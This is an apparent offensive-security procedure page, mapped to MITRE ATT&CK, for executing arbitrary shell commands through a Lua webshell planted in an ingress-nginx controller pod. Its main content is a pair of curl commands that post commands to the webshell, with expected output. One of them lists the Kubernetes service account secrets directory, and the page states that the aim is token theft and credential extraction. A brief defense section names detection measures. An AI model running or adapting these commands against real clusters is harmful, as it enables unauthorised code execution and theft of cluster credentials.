---
id: proc-006
tags:
  - rce
  - webshell
  - command-execution
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-execute-webshell-command]]'
verified: false
platforms:
  - Kubernetes
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:49.921Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Execute-Arbitrary-Commands-via-Webshell

## Summary

This procedure demonstrates RCE by sending POST requests to the Lua webshell, executing arbitrary shell commands on the ingress-nginx-controller pod and returning output.

## Description

The Lua code parses POST data for 'cmd', runs it via io.popen, and responds with stdout. This achieves blind RCE limited to the pod's context (ingress SA). Useful for reconnaissance, file reads, or further exploitation like token theft.

## Requirements

1. Webshell Ingress applied and Lua included.
2. Localhost:80 accessible.
3. curl for POST requests.
4. Knowledge of target commands (e.g., id, ls).

## Defense

Defensive measures and detection strategies:

- Disable Lua modules in NGINX if not needed.
- Monitor HTTP POSTs to unusual paths like /z/.
- Audit pod logs for io.popen executions.
- Implement request rate limiting on ingress.

## Objectives

1. Confirm RCE functionality.
2. Run diagnostic commands.
3. Gather pod environment info.
4. Pave way for credential extraction.

## Instructions

### Step 1: Test with Simple Command

**Context**: POST 'cmd=id' to trigger execution and verify output.

**Command** ([[commands/curl-execute-webshell-command]]):

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

> Expected output: Command result like "uid=2000(ingress-nginx) gid=2000(ingress-nginx) ..." in the HTTP body.

### Step 2: Run Custom Commands

**Context**: Replace 'id' with any command, e.g., 'ls /var/run/secrets' to list secrets.

**Command** (variant of above):

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=ls /var/run/secrets/kubernetes.io/serviceaccount"
```

> Expected output: Directory listing confirming SA files.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/curl-execute-webshell-command]]

## Tools Used

- [[tools/curl]]

## Tags

- rce
- webshell
- command-execution
